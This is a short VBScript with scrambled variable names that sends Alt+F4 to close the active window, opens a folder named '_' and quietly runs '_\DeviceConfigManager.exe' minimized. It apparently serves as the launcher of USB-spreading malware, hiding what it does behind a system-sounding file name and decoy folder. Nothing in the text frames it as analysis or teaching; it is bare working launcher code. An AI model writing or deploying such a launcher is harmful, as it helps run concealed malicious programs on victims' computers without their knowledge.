Dim egouaegfaoef
Dim ufiaegfoaegfeeg
Dim iazigfzegfzaeizzf
Set egouaegfaoef = wscript.CreateObject("WScript.Shell")
Set ufiaegfoaegfeeg = wscript.CreateObject("Scripting.FileSystemObject")
Set iazigfzegfzaeizzf = wscript.CreateObject("Shell.Application")
egouaegfaoef.SendKeys "%{F4}"
If ufiaegfoaegfeeg.FolderExists("_") Then
egouaegfaoef.Run "_"
End If
If ufiaegfoaegfeeg.FileExists("_\DeviceConfigManager.exe") Then
egouaegfaoef.Run "_\DeviceConfigManager.exe", 2
End If
